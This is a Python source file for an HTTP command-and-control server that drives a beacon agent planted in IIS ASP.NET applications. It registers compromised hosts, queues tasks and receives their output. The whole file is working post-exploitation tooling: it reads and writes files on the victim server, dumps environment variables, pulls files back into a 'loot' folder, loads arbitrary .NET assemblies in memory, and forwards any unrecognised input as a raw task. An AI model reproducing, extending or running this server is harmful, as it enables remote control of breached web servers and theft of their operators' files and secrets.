#!/usr/bin/env python3
"""
c2_server_v3.py — HTTP C2 Server for IIS .NET Trust Level Beacon (T2)

Handles the HTTP Beacon protocol from agent.aspx TechniqueHttpBeacon().
Works with agents running under IIS High or Medium Trust using only
managed .NET APIs (no Process.Start / cmd.exe).

Protocol:
    POST /register  — Agent registers with machine|user|os
    GET  /task       — Agent polls for next task (returns "NOP" if empty)
    POST /result     — Agent sends task output

Agent supports these managed tasks (no OS command execution):
    sysinfo          — Machine, user, OS, CLR, paths
    ls [path]        — Directory listing (default: app dir)
    cat <file>       — Read file contents
    dl <file>        — Download file as base64 (prefix: FILE:)
    write path|data  — Write file (base64 or plaintext)
    asm <base64>     — Load .NET assembly via Assembly.Load
    env              — Environment variables
    pwd              — Current working directory
    exit / die       — Kill agent beacon loop

Usage:
    python3 HTTP_c2_server.py [--port 8080] [--host 0.0.0.0]

Then in agent.aspx, select T2: HTTP Beacon, args: http://<your-ip>:8080
"""

import http.server
import threading
import argparse
import sys
import os
import base64
import readline
from datetime import datetime
from collections import OrderedDict



agents = OrderedDict()          # agent_id -> {machine, user, os, last_seen, results}
task_queue = []                 # [(task_string, task_id)]
pending_tasks = OrderedDict()   # task_id -> task_string (waiting for result)
last_dispatched = None          # last task string sent to agent
result_log = []                 # [{task, result, timestamp, agent}]
current_agent = None            # currently selected agent id
server_running = True
auto_print = True               # auto-print full results when they arrive
task_counter = 0




class C:
    GREEN  = "\033[92m"
    RED    = "\033[91m"
    YELLOW = "\033[93m"
    CYAN   = "\033[96m"
    BLUE   = "\033[94m"
    BOLD   = "\033[1m"
    DIM    = "\033[2m"
    RESET  = "\033[0m"
    WHITE  = "\033[97m"


def log(msg, color=C.DIM):
    ts = datetime.now().strftime("%H:%M:%S")
    # Clear current line, print, then reprint prompt hint
    sys.stdout.write(f"\r\033[K{color}[{ts}]{C.RESET} {msg}\n")
    sys.stdout.flush()


def print_separator():
    print(f"{C.DIM}{'─' * 72}{C.RESET}")




class C2Handler(http.server.BaseHTTPRequestHandler):

    def log_message(self, format, *args):
        pass

    def _send(self, code, body="", content_type="text/plain"):
        data = body.encode("utf-8")
        self.send_response(code)
        self.send_header("Content-Type", content_type)
        self.send_header("Content-Length", str(len(data)))
        self.send_header("Connection", "close")
        self.end_headers()
        self.wfile.write(data)

    def _read_body(self):
        length = int(self.headers.get("Content-Length", 0))
        if length > 0:
            return self.rfile.read(length).decode("utf-8", errors="replace")
        return ""

    def _agent_id(self):
        return self.client_address[0]

   

    def do_GET(self):
        global last_dispatched
        path = self.path.split("?")[0].rstrip("/")

        if path == "/task":
            aid = self._agent_id()
            if aid in agents:
                agents[aid]["last_seen"] = datetime.now()

            if task_queue:
                task_str, task_id = task_queue.pop(0)
                last_dispatched = task_str
                pending_tasks[aid] = task_str
                log(f"[TASK]  → {C.BOLD}{aid}{C.RESET}: {C.CYAN}{task_str}{C.RESET}", C.GREEN)
                self._send(200, task_str)
            else:
                self._send(200, "NOP")
            return

        self._send(404, "Not Found")



    def do_POST(self):
        path = self.path.split("?")[0].rstrip("/")
        body = self._read_body()
        aid = self._agent_id()

        if path == "/register":
            parts = body.split("|", 2)
            machine = parts[0] if len(parts) > 0 else "?"
            user    = parts[1] if len(parts) > 1 else "?"
            osver   = parts[2] if len(parts) > 2 else "?"

            is_new = aid not in agents
            agents[aid] = {
                "machine": machine,
                "user": user,
                "os": osver,
                "registered": datetime.now(),
                "last_seen": datetime.now(),
                "results": [],
            }

            if is_new:
                log(f"[NEW AGENT] {C.BOLD}{C.GREEN}{aid}{C.RESET} — "
                    f"{C.CYAN}{machine}{C.RESET}\\{C.CYAN}{user}{C.RESET} "
                    f"({osver})", C.GREEN)
            else:
                log(f"[RE-REGISTER] {aid} — {machine}\\{user}", C.YELLOW)

            self._send(200, "OK")
            return

        if path == "/result":
            ts = datetime.now()

           
            task_name = pending_tasks.pop(aid, last_dispatched or "?")

            entry = {"task": task_name, "result": body, "timestamp": ts, "agent": aid}
            result_log.append(entry)

            if aid in agents:
                agents[aid]["last_seen"] = ts
                agents[aid]["results"].append(entry)

            
            if body.startswith("FILE:"):
                b64data = body[5:]
                safe_name = task_name.replace(" ", "_").replace("/", "_").replace("\\", "_")
                fname = f"download_{ts.strftime('%Y%m%d_%H%M%S')}_{safe_name}.bin"
                fpath = os.path.join("loot", fname)
                os.makedirs("loot", exist_ok=True)
                try:
                    raw = base64.b64decode(b64data)
                    with open(fpath, "wb") as f:
                        f.write(raw)
                    log(f"[FILE]  ← {C.BOLD}{aid}{C.RESET}: "
                        f"Saved {C.GREEN}{fpath}{C.RESET} ({len(raw)} bytes)", C.GREEN)
                except Exception as e:
                    log(f"[FILE]  ← {aid}: decode error: {e}", C.RED)
            else:
                log(f"[RESULT] ← {C.BOLD}{aid}{C.RESET} "
                    f"[{C.CYAN}{task_name}{C.RESET}] "
                    f"({len(body)} bytes)", C.GREEN)

                # Auto-print full output
                if auto_print:
                    print_separator()
                    print(body)
                    print_separator()

            self._send(200, "OK")
            return

        self._send(404, "Not Found")




HELP_TEXT = f"""
{C.BOLD}═══════════════════════════════════════════════════════════════{C.RESET}
{C.BOLD} Abuse .NET Trust Level C2 — HTTP Beacon C2 Server {C.RESET}
{C.BOLD}═══════════════════════════════════════════════════════════════{C.RESET}

{C.CYAN}Agent Management:{C.RESET}
  agents / list          List connected agents
  use <id> / select <id> Select agent (for future multi-agent)

{C.CYAN}Managed Tasks (no cmd.exe — CAS restricted):{C.RESET}
  sysinfo                System info (machine, user, OS, CLR)
  ls [path]              Directory listing (default: app root)
  cat <file>             Read file contents
  dl <file>              Download file (saved to ./loot/)
  write <path>|<data>    Write file (plaintext or base64)
  asm <base64>           Load .NET assembly in-memory
  env                    Environment variables
  pwd                    Current working directory

{C.CYAN}Control:{C.RESET}
  exit / die             Kill agent beacon loop
  results / log          Show result history
  last [n]               Show last N results (default: 1)
  show <n>               Show result #n in full
  clear                  Clear task queue
  save <file>            Save all results to file
  autoprint [on|off]     Toggle auto-print of results (default: on)
  help / ?               This help text
  quit / q               Stop server and exit

{C.YELLOW}NOTE: Process.Start / cmd.exe is BLOCKED under High/Medium Trust.
      All tasks are managed .NET operations only.{C.RESET}
"""

BANNER = f"""
{C.BOLD}{C.RED}\
   ╦╦╔═╗  ╔╦╗┬─┐┬ ┬┌─┐┌┬┐  ╦  ┌─┐┬  ┬┌─┐┬
   ║║╚═╗   ║ ├┬┘│ │└─┐ │   ║  ├┤ └┐┌┘├┤ │
   ╩╩╚═╝   ╩ ┴└─└─┘└─┘ ┴   ╩═╝└─┘ └┘ └─┘┴─┘\
{C.RESET}
{C.BOLD}   HTTP Beacon C2 Server @zux0x3a {C.RESET}
{C.DIM}   For IIS High/Medium Trust Abuse
          https://0xsp.com {C.RESET}
"""


def queue_task(task_str):
    """Add a task to the queue with an ID."""
    global task_counter
    task_counter += 1
    task_queue.append((task_str, task_counter))
    log(f"[QUEUE] #{task_counter}: {C.CYAN}{task_str}{C.RESET}", C.GREEN)


def console_loop():
    
    global server_running, auto_print

    print(BANNER)
    print(HELP_TEXT)

    while server_running:
        try:
            prompt = f"{C.BOLD}{C.RED}C2{C.RESET}> "
            cmd = input(prompt).strip()
        except (EOFError, KeyboardInterrupt):
            print()
            server_running = False
            break

        if not cmd:
            continue

        lower = cmd.lower()

        
        if lower in ("quit", "q"):
            log("Shutting down...", C.YELLOW)
            server_running = False
            break

        elif lower in ("help", "?"):
            print(HELP_TEXT)

        
        elif lower in ("agents", "list", "sessions"):
            if not agents:
                log("No agents connected.", C.YELLOW)
            else:
                print()
                print(f"  {C.BOLD}{'ID':<20} {'Machine':<16} {'User':<18} {'OS':<32} {'Seen':<10} {'#Res'}{C.RESET}")
                print(f"  {'─'*100}")
                for aid, info in agents.items():
                    ago = (datetime.now() - info["last_seen"]).total_seconds()
                    if ago < 10:
                        status = f"{C.GREEN}●{C.RESET}"
                    elif ago < 60:
                        status = f"{C.YELLOW}●{C.RESET}"
                    else:
                        status = f"{C.RED}●{C.RESET}"
                    os_short = info['os'][:30]
                    print(f"  {status} {aid:<18} {info['machine']:<16} {info['user']:<18} "
                          f"{os_short:<32} {info['last_seen'].strftime('%H:%M:%S'):<10} "
                          f"{len(info['results'])}")
                print()

        elif lower.startswith(("select ", "use ")):
            aid = cmd.split(None, 1)[1].strip() if " " in cmd else ""
            if aid in agents:
                log(f"Selected agent: {C.GREEN}{aid}{C.RESET} "
                    f"({agents[aid]['machine']}\\{agents[aid]['user']})", C.GREEN)
            elif aid:
                log(f"Agent not found: {aid}", C.RED)
                if agents:
                    log(f"Available: {', '.join(agents.keys())}", C.DIM)
            else:
                log("Usage: use <agent-ip>", C.YELLOW)

        
        elif lower in ("results", "log"):
            if not result_log:
                log("No results yet.", C.YELLOW)
            else:
                print()
                print(f"  {C.BOLD}{'#':<5} {'Time':<10} {'Agent':<18} {'Task':<25} {'Size'}{C.RESET}")
                print(f"  {'─'*75}")
                for i, entry in enumerate(result_log):
                    task_preview = entry["task"][:23]
                    print(f"  {i:<5} {entry['timestamp'].strftime('%H:%M:%S'):<10} "
                          f"{entry.get('agent','?'):<18} {task_preview:<25} "
                          f"{len(entry['result'])} bytes")
                print()
                print(f"  {C.DIM}Use 'show <#>' to view full output, 'last [n]' for recent.{C.RESET}")
                print()

        elif lower.startswith("last"):
            parts = lower.split()
            n = int(parts[1]) if len(parts) > 1 and parts[1].isdigit() else 1
            recent = result_log[-n:]
            if not recent:
                log("No results.", C.YELLOW)
            else:
                for entry in recent:
                    print()
                    print(f"  {C.BOLD}[{entry['timestamp'].strftime('%H:%M:%S')}] "
                          f"{C.CYAN}{entry['task']}{C.RESET} "
                          f"({entry.get('agent', '?')})")
                    print_separator()
                    print(entry["result"])
                    print_separator()

        elif lower.startswith("show "):
            parts = lower.split()
            if len(parts) > 1 and parts[1].isdigit():
                idx = int(parts[1])
                if 0 <= idx < len(result_log):
                    entry = result_log[idx]
                    print()
                    print(f"  {C.BOLD}Result #{idx} [{entry['timestamp'].strftime('%H:%M:%S')}] "
                          f"{C.CYAN}{entry['task']}{C.RESET} "
                          f"({entry.get('agent', '?')})")
                    print_separator()
                    print(entry["result"])
                    print_separator()
                else:
                    log(f"Invalid index. Range: 0-{len(result_log)-1}", C.RED)
            else:
                log("Usage: show <result-number>", C.YELLOW)

        elif lower == "clear":
            count = len(task_queue)
            task_queue.clear()
            log(f"Cleared {count} pending task(s).", C.YELLOW)

        elif lower.startswith("save "):
            fname = cmd[5:].strip()
            try:
                with open(fname, "w") as f:
                    for i, entry in enumerate(result_log):
                        f.write(f"{'='*60}\n")
                        f.write(f"Result #{i} | {entry['timestamp']} | "
                                f"Agent: {entry.get('agent','?')} | "
                                f"Task: {entry['task']}\n")
                        f.write(f"{'='*60}\n")
                        f.write(entry["result"])
                        f.write("\n\n")
                log(f"Saved {len(result_log)} results to {C.GREEN}{fname}{C.RESET}", C.GREEN)
            except Exception as e:
                log(f"Save error: {e}", C.RED)

        elif lower.startswith("autoprint"):
            parts = lower.split()
            if len(parts) > 1:
                auto_print = parts[1] in ("on", "true", "1", "yes")
            else:
                auto_print = not auto_print
            log(f"Auto-print: {C.GREEN if auto_print else C.RED}"
                f"{'ON' if auto_print else 'OFF'}{C.RESET}", C.GREEN)

    

        
        elif lower in ("sysinfo", "info", "env", "pwd", "ls", "dir"):
            # bare 'ls' → send 'ls .' so agent lists current/app dir
            if lower in ("ls", "dir"):
                queue_task(f"{cmd} .")
            else:
                queue_task(cmd)

        elif lower.startswith(("ls ", "dir ", "cat ", "read ", "dl ",
                               "download ", "write ", "upload ",
                               "asm ", "loadasm ")):
            queue_task(cmd)

        elif lower in ("exit", "die"):
            queue_task(cmd)
            log(f"Kill signal queued. Agent will terminate.", C.YELLOW)

       
        else:
            log(f"Unknown local command. Sending to agent as raw task.", C.YELLOW)
            queue_task(cmd)




def main():
    global server_running

    parser = argparse.ArgumentParser(
        description="IIS Trust Level C2 — HTTP Beacon Server v3")
    parser.add_argument("--host", default="0.0.0.0",
                        help="Listen address (default: 0.0.0.0)")
    parser.add_argument("--port", type=int, default=8080,
                        help="Listen port (default: 8080)")
    args = parser.parse_args()

    os.makedirs("loot", exist_ok=True)

    server = http.server.HTTPServer((args.host, args.port), C2Handler)
    server.timeout = 1

    def serve():
        while server_running:
            server.handle_request()

    thread = threading.Thread(target=serve, daemon=True)
    thread.start()

    print()
    log(f"Listening on {C.BOLD}{args.host}:{args.port}{C.RESET}", C.GREEN)
    log(f"Agent args:  {C.CYAN}http://<this-ip>:{args.port}{C.RESET}", C.GREEN)
    log(f"Loot dir:    {C.CYAN}./loot/{C.RESET}", C.GREEN)
    log(f"Auto-print:  {C.GREEN}ON{C.RESET} (results display automatically)", C.GREEN)
    print()

    try:
        console_loop()
    except Exception as e:
        log(f"Console error: {e}", C.RED)
    finally:
        server_running = False
        server.server_close()
        log("Server stopped.", C.YELLOW)


if __name__ == "__main__":
    main()
